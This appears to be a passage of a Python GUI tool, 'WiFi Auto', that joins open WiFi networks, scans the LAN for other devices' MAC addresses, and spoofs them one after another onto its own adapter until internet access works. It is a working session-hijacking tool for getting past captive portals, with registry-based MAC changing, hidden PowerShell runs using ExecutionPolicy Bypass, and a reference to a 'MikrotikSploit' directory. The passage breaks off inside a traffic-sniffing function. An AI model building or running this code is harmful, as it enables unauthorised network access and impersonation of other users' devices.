#!/usr/bin/env python3
"""
WiFi Auto GUI - fully self-contained single-file tool (Cross-Platform: Windows & Linux).
Finds open (passwordless) WiFi networks, connects to the selected one, scans the
devices on that network, sniffs/ranks their activity, then spoofs that device's MAC
address on our own adapter. After 10 seconds it tests the internet (ping Google).
If the test fails it tries the next device's MAC (from the scan results only -
never random), repeating until the internet works or you press Stop.
If a MAC change itself fails (driver reverts) it does NOT go back to the old MAC:
it moves on to the next scanned MAC directly.

Everything runs from inside this script (native Python pings, inline PowerShell
statements, no external .exe tools and no .ps1 script files).

Every step is written to report.txt (next to this script) so you can copy the errors easily.

Run as Administrator (Windows) or sudo (Linux) for full results (MAC change + ARP sweep).
"""

import ctypes
import ipaddress
import os
import queue
import re
import signal
import socket
import struct
import subprocess
import sys
import threading
import time
import tkinter as tk
from datetime import datetime
from tkinter import filedialog, messagebox, ttk

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from updater import start_update_check

APP_TITLE = "WiFi Auto"
APP_VERSION = "2.4"
DEVELOPER = "ALX-ZORO"

ICON_B64 = "iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAABcElEQVR42u2bvQ0CMQxGPQOiQicKWmZiBoZlDKQrWAA6BKf7SWzHIeQVLq644nt2bCdxZLcfnj2bAAAAAAAAAAAQZ4fjedP+CkCK4JpA5FdFR8GQVoSXAiEtiveEIC0K9wQhrYu3QpAa4ofL9W2n2/hl0RAkQvyn4KlNAViBFAdgEZ7zrwVEMQAa4R7rWwOiGgBP4UsgqgDwFj+XA2pAkCjxmiQYAcEFQI54rzWfCsEMwCLemgy3QHhAcAFQOhluQSgGQOv9EpVgCYI1CsTb+ynita3wGoRwAGve13SGORVAEwXZALy9n5oQtYlPGwUS4X3LXqB0FLgB2PL+5/d9fCxailfnxIYD0FaENfFTCLmZvzoAq/dzo6A5ACni56KgWQCa8M9ZBgBgCZAEfwtAV2Ww+0ao61a4i81Q99thDkQ4EuNQlGNxLka4GuNylOtxBiQYkWFIijE5BiUZlWVYmnF5HkzwZIZHUzybA8AfAngBQZubRKg2MjUAAAAASUVORK5CYII="

# ---- Dark theme palette ----
COL_BG = "#12141C"          # window background
COL_PANEL = "#1C1F2A"       # panels / frames
COL_PANEL2 = "#232734"      # inputs, listbox
COL_BORDER = "#2E3342"      # borders
COL_TEXT = "#E8EAED"        # primary text
COL_MUTED = "#9AA3B2"       # secondary text
COL_ACCENT = "#22D3EE"      # cyan accent
COL_GREEN = "#10B981"       # success / Start
COL_RED = "#EF4444"         # danger / Stop
COL_AMBER = "#F59E0B"       # warning
COL_LOG_BG = "#0E1017"      # log area

SNIFF_SECONDS = 10
PING_WAIT_SECONDS = 10
EMPTY_ROUNDS_LIMIT = 5
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
REPORT_PATH = os.path.join(SCRIPT_DIR, "report.txt")
MIKROTIK_DIR = os.path.join(SCRIPT_DIR, "MikrotikSploit")

ANSI_COLORS = {
    "30": "#0E1017", "31": "#EF4444", "32": "#10B981", "33": "#F59E0B",
    "34": "#22D3EE", "35": "#A78BFA", "36": "#22D3EE", "37": "#E8EAED",
    "90": "#9AA3B2", "91": "#EF4444", "92": "#10B981", "93": "#F59E0B",
    "94": "#22D3EE", "95": "#A78BFA", "96": "#22D3EE", "97": "#E8EAED",
}

IS_WINDOWS = sys.platform.startswith("win")

def is_admin_or_root():
    if IS_WINDOWS:
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            return False
    else:
        return os.geteuid() == 0

IS_ROOT = is_admin_or_root()
MAC_RE = re.compile(r"^([0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}$")
PLAIN_MAC_RE = re.compile(r"^[0-9a-f]{12}$")


def relaunch_as_admin():
    """Re-launch this script with UAC elevation (Windows only)."""
    if not IS_WINDOWS or IS_ROOT:
        return True
    try:
        params = " ".join('"%s"' % a for a in sys.argv[1:])
        code = ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable,
            '"%s" %s' % (os.path.abspath(__file__), params),
            None, 1)
        return code > 32
    except Exception:
        return False


def get_device_info():
    """Detect device model + OS + kernel version automatically."""
    parts = []
    if not IS_WINDOWS:
        for p in ("/sys/class/dmi/id/sys_vendor",
                  "/sys/class/dmi/id/product_name"):
            try:
                with open(p) as f:
                    v = f.read().strip()
            except OSError:
                continue
            if v and v.lower() not in ("none", "system product name",
                                       "to be filled by o.e.m.", "oem",
                                       "not specified"):
                parts.append(v)
        try:
            with open("/etc/os-release") as f:
                for line in f:
                    if line.startswith("PRETTY_NAME="):
                        parts.append(
                            line.split("=", 1)[1].strip().strip('"'))
                        break
        except OSError:
            pass
        try:
            parts.append(f"kernel {os.uname().release}")
        except OSError:
            pass
    else:
        try:
            import platform as _pf
            parts.append(f"{_pf.system()} {_pf.release()}")
            cpu = _pf.processor()
            if cpu:
                parts.append(cpu)
        except Exception:
            pass
    out = []
    for p in parts:
        if p and p not in out:
            out.append(p)
    return " | ".join(out) or "Unknown device"


# ---------------------------------------------------------------------------
# Report file (auto-written log, so you can copy errors easily)
# ---------------------------------------------------------------------------

def timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


class Report:
    def __init__(self, path):
        self.path = path
        self.lock = threading.Lock()
        try:
            # "w" = wipe previous sessions: every launch starts clean
            with open(self.path, "w", encoding="utf-8") as f:
                f.write(f"===== Session started {timestamp()} =====\n")
        except OSError:
            self.path = None

    def write(self, msg):
        line = f"[{timestamp()}] {msg}"
        if self.path:
            with self.lock:
                try:
                    with open(self.path, "a", encoding="utf-8") as f:
                        f.write(line + "\n")
                except OSError:
                    pass
        return line


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def run(cmd, timeout=60, no_window=True):
    """Run a command. On Windows the console window is hidden by default."""
    try:
        kwargs = dict(capture_output=True, text=True,
                      errors="replace", timeout=timeout)
        if IS_WINDOWS and no_window:
            kwargs["creationflags"] = (
                getattr(subprocess, "CREATE_NO_WINDOW", 0) | 0x08000000)
        p = subprocess.run(cmd, **kwargs)
        return p.returncode, p.stdout, p.stderr
    except (subprocess.TimeoutExpired, OSError) as e:
        return -1, "", str(e)


def run_in_terminal(cmd, cwd=None):
    """Launch a command in a new terminal window (kept open)."""
    if IS_WINDOWS:
        subprocess.Popen(["cmd", "/c", "start", "", "cmd", "/k", cmd])
        return
    import shlex
    full = f"cd {shlex.quote(cwd)} && {cmd}" if cwd else cmd
    try:
        subprocess.Popen(["gnome-terminal", "--", "bash", "-c", full])
    except OSError:
        subprocess.Popen(["xterm", "-e", "bash", "-c", full])


def make_selectable_copyable(widget):
    """Allow mouse selection + Ctrl+C / Ctrl+Shift+C copy on a Text widget,
    while blocking typing/editing (read-only but copyable)."""
    widget.configure(state=tk.NORMAL)

    def _block(event):
        ctrl = event.state & 0x4
        if ctrl and event.keysym.lower() == "c":
            try:
                widget.event_generate("<<Copy>>")
            except tk.TclError:
                pass
            return "break"
        return "break"

    widget.bind("<Key>", _block)
    return widget


# ---------------------------------------------------------------------------
# MAC address helpers
# ---------------------------------------------------------------------------

def normalize_mac(value):
    """Accept AA:BB:CC:DD:EE:FF / AA-BB-CC-DD-EE-FF / AABBCCDDEEFF.
    Returns the plain 12-hex form, or None if invalid."""
    s = value.strip().lower().replace("-", "").replace(":", "").replace(".", "")
    if len(s) != 12 or not re.fullmatch(r"[0-9a-f]{12}", s):
        return None
    return s


def pretty_mac(plain):
    return ":".join(plain[i:i + 2] for i in range(0, 12, 2))


# ---------------------------------------------------------------------------
# ---------------------------------------------------------------------------
# Native MAC changer - pure in-script, no external tools or script files.
# Uses the method proven to work on the Realtek 8821CE driver:
# disable adapter -> write NetworkAddress registry value -> enable adapter.
# ---------------------------------------------------------------------------


def change_mac_native(iface, plain, log):
    """Change the MAC address using only Windows built-ins passed inline
    to PowerShell (no .ps1 files, no external .exe tools)."""
    mac_str = plain.upper()
    esc = iface.replace("'", "''")
    ps = (
        "$ErrorActionPreference='SilentlyContinue';"
        "$n='" + esc + "';"
        "$mac='" + mac_str + "';"
        "$a=Get-NetAdapter -Name $n;"
        "if(-not $a){throw 'Adapter not found'};"
        "Disable-NetAdapter -Name $n -Confirm:$false;"
        "Start-Sleep -Seconds 3;"
        "$root='HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Class';"
        "$guid=$a.InterfaceGuid;"
        "if($guid){$guid=$guid.ToString().Replace('{','').Replace('}','').ToUpper()};"
        "$key=$null;"
        "if($guid){"
        " Get-ChildItem $root -ErrorAction SilentlyContinue | ForEach-Object {"
        "  Get-ChildItem $_.PSPath -ErrorAction SilentlyContinue | ForEach-Object {"
        "   $id=(Get-ItemProperty $_.PSPath -Name NetCfgInstanceId -ErrorAction SilentlyContinue).NetCfgInstanceId;"
        "   if($id){$id=$id.ToString(); if($id.Replace('{','').Replace('}','').ToUpper() -eq $guid){$key=$_.PSPath}}"
        "  }"
        " }"
        "};"
        "if(-not $key){"
        " Get-ChildItem $root -ErrorAction SilentlyContinue | ForEach-Object {"
        "  Get-ChildItem $_.PSPath -ErrorAction SilentlyContinue | ForEach-Object {"
        "   $d=(Get-ItemProperty $_.PSPath -Name DriverDesc -ErrorAction SilentlyContinue).DriverDesc;"
        "   if($d -and $d -eq $a.InterfaceDescription -and -not $key){$key=$_.PSPath}"
        "  }"
        " }"
        "};"
        "if(-not $key){Enable-NetAdapter -Name $n -Confirm:$false;"
        " throw 'Registry key for adapter not found'};"
        "Set-ItemProperty -Path $key -Name NetworkAddress -Value $mac -Type String;"
        "Start-Sleep -Seconds 1;"
        "Enable-NetAdapter -Name $n -Confirm:$false;"
        "Start-Sleep -Seconds 5;"
        "$cur=(Get-NetAdapter -Name $n -ErrorAction SilentlyContinue).MacAddress;"
        "if($cur){$cur=$cur.Replace('-','').ToUpper()};"
        "if($cur -eq $mac){Write-Output 'OK'}else{Write-Output ('REVERTED:'+$cur)}"
    )
    log("$ powershell -Command <native disable->registry->enable>")
    rc, out, err = run(["powershell", "-NoProfile", "-ExecutionPolicy",
                        "Bypass", "-Command", ps], timeout=50)
    if out.strip():
        log(out.strip())
    if rc != 0 and err.strip():
        log(err.strip())
    return rc == 0 and "OK" in out and "REVERTED" not in out


def set_mac(iface, mac, log):
    """Change MAC address across Windows and Linux with driver verification."""
    plain = normalize_mac(mac)
    if plain is None:
        log(f"[ERROR] invalid MAC address: {mac}")
        return False

    if IS_WINDOWS:
        for attempt in (1, 2):
            if change_mac_native(iface, plain, log):
                log(f"OK: {iface} MAC changed to {pretty_mac(plain)}")
                return True
            log(f"[ERROR] MAC change attempt {attempt} failed - the driver "
                f"reverted it.")
            time.sleep(2)
        return False
    else:
        mac_str = pretty_mac(plain)
        base = (["sudo"] if os.geteuid() != 0 else []) + ["ip", "link", "set", "dev", iface]
        for step in ("down", "address " + mac_str, "up"):
            cmd = base + ([step] if step in ("down", "up") else ["address", mac_str])
            log(f"$ {' '.join(cmd)}")
            rc, out, err = run(cmd)
            if out.strip():
                log(out.strip())
            if err.strip():
                log(err.strip())
            if rc != 0:
                log(f"[ERROR] command failed (exit {rc}). Make sure you run with sudo.")
                run(base + ["up"])
                return False
        log(f"OK: {iface} MAC changed to {mac_str}")
        return True


def set_mac_and_verify(iface, mac, log):
    """Change MAC then read back the adapter value to confirm it stuck.
    Returns True only if the NIC really reports the new MAC."""
    if not set_mac(iface, mac, log):
        return False
    for _ in range(6):
        current = get_iface_mac(iface)
        if current and normalize_mac(current) == normalize_mac(mac):
            return True
        time.sleep(2)
    log(f"[WARN] set_mac returned OK but adapter reports {current} "
        f"(expected {mac}) - treated as failure.")
    return False


# ---------------------------------------------------------------------------
# Network detection & interface helpers
# ---------------------------------------------------------------------------

def get_local_ip():
    """Return the real LAN IPv4 address of this machine.
    On Windows it is resolved from the interface that owns the default
    route, so VPN/tunnel interfaces (Cloudflare WARP etc.) are skipped."""
    if IS_WINDOWS:
        try:
            rc, out, _ = run(
                ["powershell", "-Command",
                 "(Get-NetRoute -DestinationPrefix '0.0.0.0/0' "
                 "-ErrorAction SilentlyContinue | Sort-Object RouteMetric "
                 "| Select-Object -First 1 -ExpandProperty ifIndex)"])
            if rc == 0 and out.strip():
                idx = int(out.strip())
                rc, out2, _ = run(
                    ["powershell", "-Command",
                     f"(Get-NetIPAddress -AddressFamily IPv4 "
                     f"-InterfaceIndex {idx} "
                     "-ErrorAction SilentlyContinue).IPAddress"])
                if rc == 0 and out2.strip():
                    for line in out2.splitlines():
                        ip = line.strip()
                        if re.match(r"^\d+\.\d+\.\d+\.\d+$", ip):
                            return ip
        except (ValueError, OSError):
            pass
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except OSError:
        return socket.gethostbyname(socket.gethostname())
    finally:
        s.close()


def get_network(local_ip):
    """Return the network as ipaddress.IPv4Network."""
    try:
        if IS_WINDOWS:
            rc, out, _ = run(["powershell", "-Command", f"(Get-NetIPAddress -IPAddress '{local_ip}' -ErrorAction SilentlyContinue).PrefixLength"])
            if rc == 0 and out.strip():
                prefix = int(out.strip())
                return ipaddress.ip_network(f"{local_ip}/{prefix}", strict=False)
        else:
            import netifaces  # optional
            iface = netifaces.gateways()["default"][netifaces.AF_INET][1]
            netmask = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]["netmask"]
            return ipaddress.ip_network(f"{local_ip}/{netmask}", strict=False)
    except Exception:
        pass
    return ipaddress.ip_network(f"{local_ip}/24", strict=False)


def get_all_adapters():
    if IS_WINDOWS:
        rc, out, _ = run(["powershell", "-Command", "Get-NetAdapter | Select-Object -ExpandProperty Name"])
        if rc == 0 and out.strip():
            return [l.strip() for l in out.splitlines() if l.strip()]
    else:
        try:
            return os.listdir("/sys/class/net")
        except Exception:
            pass
    return []


def get_wifi_iface():
    if IS_WINDOWS:
        rc, out, _ = run(["powershell", "-Command", "(Get-NetAdapter | Where-Object {$_.InterfaceDescription -like '*8821CE*' -or $_.InterfaceDescription -like '*Realtek*' -or $_.InterfaceDescription -like '*Wireless*' -or $_.Name -like '*Wi-Fi*'}).Name"])
        if rc == 0 and out.strip():
            lines = [l.strip() for l in out.splitlines() if l.strip()]
            for l in lines:
                if "8821CE" in l or "Realtek" in l:
                    return l
            if lines:
                return lines[0]
        adapters = get_all_adapters()
        return adapters[0] if adapters else "Wi-Fi"
    else:
        rc, out, _ = run(["nmcli", "-t", "-f", "DEVICE,TYPE", "device", "status"])
        for line in out.splitlines():
            if ":" in line:
                dev, typ = line.split(":", 1)
                if typ == "wifi" and dev:
                    return dev
        return None


def get_iface_mac(iface):
    if IS_WINDOWS:
        rc, out, _ = run(["powershell", "-Command", f"(Get-NetAdapter -Name '{iface}' -ErrorAction SilentlyContinue).MacAddress"])
        if rc == 0 and out.strip():
            return out.strip().replace("-", ":")
        return None
    else:
        try:
            with open(f"/sys/class/net/{iface}/address") as f:
                return f.read().strip()
        except OSError:
            return None


def get_default_gateway():
    if IS_WINDOWS:
        rc, out, _ = run(["ipconfig"])
        for line in out.splitlines():
            if "Default Gateway" in line or "البوابة الافتراضية" in line:
                parts = line.split(":")
                if len(parts) > 1:
                    ip = parts[1].strip()
                    if ip and not ip.startswith("::"):
                        return ip
        rc, out, _ = run(["route", "print", "0.0.0.0"])
        for line in out.splitlines():
            parts = line.split()
            if len(parts) >= 3 and parts[0] == "0.0.0.0":
                return parts[2]
        return None
    else:
        rc, out, _ = run(["ip", "route", "show", "default"])
        m = re.search(r"default via (\S+)", out)
        return m.group(1) if m else None


def scan_open_wifi():
    """Return sorted list of open (passwordless) network SSIDs."""
    if IS_WINDOWS:
        rc, out, err = run(["netsh", "wlan", "show", "networks", "mode=bssid"])
        if rc != 0:
            raise RuntimeError(err.strip() or "netsh wlan show networks failed")
        # Parse the standard english netsh output (SSID / Authentication /
        # Encryption). Handle empty SSIDs too (they are open but unnamed).
        ssid_re = re.compile(r"^\s*SSID\s*\d+\s*:\s*(.*)$", re.IGNORECASE)
        auth_re = re.compile(r"^\s*(Authentication|مصادقة)\s*:\s*(.*)$", re.IGNORECASE)
        enc_re = re.compile(r"^\s*(Encryption|تشفير)\s*:\s*(.*)$", re.IGNORECASE)
        seen = {}
        current_ssid = None
        is_open = False
        for line in out.splitlines():
            m = ssid_re.match(line)
            if m:
                current_ssid = m.group(1).strip()
                is_open = False
                continue
            m = auth_re.match(line)
            if m:
                if m.group(2).strip().lower() == "open":
                    is_open = True
                else:
                    is_open = False
                continue
            m = enc_re.match(line)
            if m:
                if m.group(2).strip().lower() == "none" and is_open:
                    if current_ssid and current_ssid.strip():
                        seen[current_ssid] = True
                is_open = False
                continue
        return sorted(seen.keys())
    else:
        rc, out, err = run(["nmcli", "-t", "-f", "SSID,SECURITY",
                            "dev", "wifi", "list"])
        if rc != 0:
            raise RuntimeError(err.strip() or "nmcli wifi list failed")
        seen = {}
        for line in out.splitlines():
            parts = line.rsplit(":", 1)
            if len(parts) != 2:
                continue
            ssid, sec = parts
            if not ssid or sec.strip():
                continue
            seen[ssid] = True
        return sorted(seen)


def connect_wifi(ssid):
    if IS_WINDOWS:
        xml_content = f"""<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid}</name>
    <SSIDConfig>
        <SSID>
            <name>{ssid}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>open</authentication>
                <encryption>none</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
        </security>
    </MSM>
</WLANProfile>
"""
        import tempfile
        fd, tmp_path = tempfile.mkstemp(suffix=".xml", prefix="wifi_profile_")
        os.close(fd)
        try:
            with open(tmp_path, "w", encoding="utf-8") as f:
                f.write(xml_content)
            run(["netsh", "wlan", "add", "profile", f"filename={tmp_path}"])
        finally:
            try:
                os.remove(tmp_path)
            except OSError:
                pass
        rc, _, err = run(["netsh", "wlan", "connect", f"name={ssid}", f"ssid={ssid}"])
        return rc == 0, err
    else:
        rc, _, err = run(["nmcli", "dev", "wifi", "connect", ssid])
        return rc == 0, err


def disconnect_wifi(iface):
    if IS_WINDOWS:
        run(["netsh", "wlan", "disconnect"])
    else:
        run(["nmcli", "dev", "disconnect", iface])


# ---------------------------------------------------------------------------
# ARP sweep, Ping Sweep & ARP table
# ---------------------------------------------------------------------------

def _default_iface_linux():
    try:
        with open("/proc/net/route") as f:
            for line in f.readlines()[1:]:
                parts = line.split()
                if len(parts) > 1 and parts[1] == "00000000":
                    return parts[0]
    except OSError:
        pass
    return None


def _iface_mac_linux(iface):
    try:
        with open(f"/sys/class/net/{iface}/address") as f:
            return f.read().strip()
    except OSError:
        return None


def _iface_ip_linux(iface):
    try:
        import fcntl
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        res = fcntl.ioctl(s.fileno(), 0x8915,
                          struct.pack("256s", iface.encode()[:15]))
        return socket.inet_ntoa(res[20:24])
    except Exception:
        return None


def _arp_request(src_mac, src_ip, dst_ip):
    src_mac_b = bytes.fromhex(src_mac.replace(":", ""))
    eth = struct.pack("!6s6sH",
                      bytes.fromhex("ffffffffffff"),
                      src_mac_b, 0x0806)
    arp = struct.pack("!HHBBH6s4s6s4s",
                      1, 0x0800, 6, 4, 1,
                      src_mac_b,
                      socket.inet_aton(src_ip),
                      b"\x00" * 6,
                      socket.inet_aton(dst_ip))
    return eth + arp


def arp_sweep(hosts, stop_event=None, progress_cb=None):
    if IS_WINDOWS or not IS_ROOT:
        return {}
    iface = _default_iface_linux()
    src_mac = _iface_mac_linux(iface) if iface else None
    src_ip = _iface_ip_linux(iface) if iface else None
    if not (iface and src_mac and src_ip):
        return {}

    found = {}
    try:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                          socket.htons(0x0806))
        s.bind((iface, 0))
        s.settimeout(0.6)
    except OSError:
        return {}

    try:
        for ip in hosts:
            if stop_event is not None and stop_event.is_set():
                break
            try:
                s.send(_arp_request(src_mac, src_ip, ip))
            except OSError:
                break
        host_set = set(hosts)
        while True:
            try:
                data, _ = s.recvfrom(2048)
            except socket.timeout:
                break
            except OSError:
                break
            if len(data) < 42 or struct.unpack("!H", data[12:14])[0] != 0x0806:
                continue
            htype, ptype, hlen, plen, op = struct.unpack("!HHBBH", data[14:22])
            if htype != 1 or ptype != 0x0800 or op != 2:
                continue
            mac = ":".join(f"{b:02x}" for b in data[22:28])
            ip = socket.inet_ntoa(data[28:32])
            if ip in host_set:
                found[ip] = mac
                if progress_cb is not None:
                    progress_cb(ip, mac)
    finally:
        s.close()
    return found


def ping_host(ip):
    if IS_WINDOWS:
        cmd = ["ping", "-n", "1", "-w", "100", str(ip)]
    else:
        cmd = ["ping", "-c", "1", "-W", "1", str(ip)]
    try:
        kwargs = {"stdout": subprocess.DEVNULL, "stderr": subprocess.DEVNULL}
        if IS_WINDOWS:
            kwargs["creationflags"] = 0x08000000
        with open(os.devnull, "w") as devnull:
            return subprocess.call(cmd, **kwargs) == 0
    except OSError:
        return False


def build_scan_scope(local_ip, gateway_ip=None):
    """Hosts to sweep: /24 of the local IP + /22 around the gateway +
    /22 around the local IP (deduplicated)."""
    ips = set()

    def add_net(net_str):
        try:
            net = ipaddress.ip_network(net_str, strict=False)
            for h in net.hosts():
                ips.add(h)
        except ValueError:
            pass

    if local_ip:
        try:
            n = int(ipaddress.ip_address(local_ip))
            add_net(f"{ipaddress.IPv4Address(n & ~1023)}/22")
        except ValueError:
            add_net(f"{local_ip}/24")
    if gateway_ip:
        try:
            g = int(ipaddress.ip_address(gateway_ip))
            add_net(f"{ipaddress.IPv4Address(g & ~1023)}/22")
        except ValueError:
            add_net(f"{gateway_ip}/24")
    return list(ips)


def _icmp_checksum(data):
    """RFC 1071 checksum for an ICMP echo packet."""
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def ping_host_native(ip, timeout=0.6):
    """Ping in pure Python: ICMP echo via raw socket when running as
    admin, otherwise the UDP closed-port trick. No ping.exe needed."""
    ip = str(ip)
    if IS_ROOT:
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                                 socket.IPPROTO_ICMP)
        except OSError:
            sock = None
        if sock is not None:
            try:
                import random
                ident = os.getpid() & 0xFFFF
                seq = random.randint(0x1000, 0xFFFF)
                payload = b"\x20\x21\x22\x23" + os.urandom(28)
                pkt = struct.pack("!BBHHH", 8, 0, 0, ident, seq) + payload
                pkt = pkt[:2] + struct.pack("!H", _icmp_checksum(pkt)) \
                    + pkt[4:]
                sock.settimeout(timeout)
                sock.sendto(pkt, (ip, 1))
                while True:
                    try:
                        data, _ = sock.recvfrom(512)
                    except socket.timeout:
                        return False
                    ihl = (data[0] & 0x0F) * 4
                    icmp = data[ihl:]
                    if len(icmp) < 8:
                        continue
                    typ, _code, _chk, pid, sq = struct.unpack("!BBHHH",
                                                              icmp[:8])
                    if typ == 0 and pid == ident and sq == seq:
                        return True
            except OSError:
                return False
            finally:
                try:
                    sock.close()
                except OSError:
                    pass
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(timeout)
        s.sendto(b"x", (ip, 7))
        try:
            s.recvfrom(64)
        except OSError as e:
            if getattr(e, "errno", None) in (10054, 10061):
                return True
    except OSError:
        pass
    finally:
        try:
            s.close()
        except OSError:
            pass
    # Last resort: standard Windows ping.exe (built-in, hidden window).
    try:
        kw = {"stdout": subprocess.DEVNULL, "stderr": subprocess.DEVNULL}
        if IS_WINDOWS:
            kw["creationflags"] = 0x08000000
        with open(os.devnull, "w") as devnull:
            return subprocess.call(
                ["ping", "-n", "1", "-w", "200", ip], **kw) == 0
    except OSError:
        return False


def ping_host_icmp(ip, timeout_ms=150):
    """Real ICMP echo via the Windows IcmpSendEcho API - the same engine
    ping.exe uses. Pure ctypes, bounded timeout, no external tools."""
    try:
        dll = ctypes.WinDLL("iphlpapi", use_last_error=True)
        dll.IcmpCreateFile.restype = ctypes.c_void_p
        dll.IcmpSendEcho.argtypes = [
            ctypes.c_void_p, ctypes.c_ulong, ctypes.c_void_p,
            ctypes.c_ushort, ctypes.c_void_p, ctypes.c_void_p,
            ctypes.c_ulong, ctypes.c_ulong]
        dll.IcmpSendEcho.restype = ctypes.c_ulong
        dll.IcmpCloseHandle.argtypes = [ctypes.c_void_p]
        h = dll.IcmpCreateFile()
        if not h:
            return False
        try:
            addr = ctypes.c_ulong(
                int.from_bytes(socket.inet_aton(ip), "big"))
            data = ctypes.create_string_buffer(32)
            buf = ctypes.create_string_buffer(4096)
            n = dll.IcmpSendEcho(h, addr, data, 32, None, buf, 4096,
                                 timeout_ms)
            if n >= 1:
                status = struct.unpack_from("<I", buf.raw, 4)[0]
                return status == 0
            return False
        finally:
            dll.IcmpCloseHandle(h)
    except Exception:
        return False


def ping_sweep(hosts, stop_event=None, max_workers=128):
    """Parallel ICMP sweep of a host list. Windows uses the native
    IcmpSendEcho engine (pure ctypes, no files, no external tools);
    Linux uses a raw-socket thread pool. Pings populate the system
    ARP/neighbour table so the MACs can be read afterwards."""
    if not hosts or (stop_event and stop_event.is_set()):
        return
    ip_list = [str(h) for h in hosts]

    def worker(ip):
        if stop_event and stop_event.is_set():
            return
        if IS_WINDOWS:
            ping_host_icmp(ip, 150)
        else:
            ping_host_native(ip)

    from concurrent.futures import ThreadPoolExecutor
    with ThreadPoolExecutor(max_workers=max_workers) as ex:
        futures = [ex.submit(worker, ip) for ip in ip_list]
        for f in futures:
            try:
                f.result(timeout=5)
            except Exception:
                pass


def get_arp_table():
    """Read the full system ARP/neighbour table. Returns {ip: mac}."""
    entries = {}
    try:
        if IS_WINDOWS:
            out = subprocess.check_output(["arp", "-a"], text=True,
                                          errors="replace",
                                          creationflags=(0x08000000 if
                                                         IS_WINDOWS else 0))
            for line in out.splitlines():
                m = re.search(r"(\d+\.\d+\.\d+\.\d+)\s+([0-9a-fA-F-]{17})",
                              line)
                if m:
                    mac = m.group(2).replace("-", ":")
                    if MAC_RE.match(mac) and not mac.startswith("ff:ff:ff"):
                        entries[m.group(1)] = mac
        else:
            try:
                out = subprocess.check_output(["ip", "neigh", "show"],
                                              text=True, errors="replace")
                for line in out.splitlines():
                    m = re.match(r"(\d+\.\d+\.\d+\.\d+)\s+dev\s+\S+\s+"
                                 r"lladdr\s+([0-9a-f:]+)", line)
                    if m and MAC_RE.match(m.group(2)):
                        entries[m.group(1)] = m.group(2)
            except OSError:
                out = subprocess.check_output(["arp", "-an"], text=True,
                                              errors="replace",
                                              creationflags=(0x08000000 if
                                                             IS_WINDOWS
                                                             else 0))
                for line in out.splitlines():
                    m = re.search(r"\((\d+\.\d+\.\d+\.\d+)\)\s+at\s+"
                                  r"([0-9a-fA-F:]+)", line)
                    if m and MAC_RE.match(m.group(2)):
                        entries[m.group(1)] = m.group(2)
    except (subprocess.CalledProcessError, OSError):
        pass
    return entries


def _filter_devices(devices, my_mac, gateway_ip, allowed=None):
    """Drop self, gateway, broadcasts and IPs outside the scanned scope."""
    out = {}
    for ip, mac in devices.items():
        try:
            addr = ipaddress.ip_address(ip)
        except ValueError:
            continue
        if allowed and ip not in allowed:
            continue
        mac = mac.lower()
        if mac == my_mac.lower():
            continue
        if ip == gateway_ip:
            continue
        if mac.startswith("ff:ff:ff") or mac.startswith("01:00:5e"):
            continue
        out[ip] = mac
    return out


def udp_probe_sweep(hosts, stop_event=None, max_workers=128):
    """Send a tiny UDP datagram to every host in parallel. Even if the
    host drops it, the attempt forces an ARP lookup, which adds the
    device's MAC to the system ARP/neighbour table. Pure Python."""
    if not hosts or (stop_event and stop_event.is_set()):
        return
    ip_list = [str(h) for h in hosts]

    def probe(ip):
        if stop_event and stop_event.is_set():
            return
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(0.2)
            s.sendto(b"x", (ip, 9))
            s.close()
        except OSError:
            pass

    from concurrent.futures import ThreadPoolExecutor
    with ThreadPoolExecutor(max_workers=max_workers) as ex:
        futs = [ex.submit(probe, ip) for ip in ip_list]
        for f in futs:
            try:
                f.result(timeout=3)
            except Exception:
                pass


def scan_devices(scope_hosts, stop_event, my_mac, gateway_ip, duration=15,
                 progress=None):
    """Deep scan: keep re-sweeping the WHOLE scope for the full duration
    and merge every ARP sighting, so slow/quiet devices are still found.
    Returns {ip: mac} for all non-self, non-gateway devices in scope."""
    allowed = set(str(h) for h in scope_hosts)
    devices = {}
    deadline = time.time() + duration
    passes = 0
    while time.time() < deadline and not (stop_event and stop_event.is_set()):
        if time.time() >= deadline:
            break
        passes += 1
        known = set()
        for ip, mac in devices.items():
            f = _filter_devices({ip: mac}, my_mac, gateway_ip, allowed)
            if f:
                known.add(ip)
        pending = [h for h in scope_hosts
                   if str(h) not in known or passes == 1]
        udp_probe_sweep(pending, stop_event, max_workers=128)
        try:
            found = arp_sweep([str(h) for h in scope_hosts], stop_event)
            devices.update(found)
        except Exception:
            pass
        devices.update(get_arp_table())
        cur = _filter_devices(devices, my_mac, gateway_ip, allowed)
        if progress:
            progress(f"Deep scan pass {passes}: {len(cur)} device(s) so far "
                     f"({int(deadline - time.time())}s left)")
        wait_for(stop_event, 1.0)
    return _filter_devices(devices, my_mac, gateway_ip, allowed)


def sniff_traffic_rank(iface, seconds, stop_event):
    """Run traffic sniffing or ping sweep ranking."""
    ranks = {}
    if IS_WINDOWS:
        try:
            local_ip = get_local_ip()
            gateway_ip = get_default_gateway()
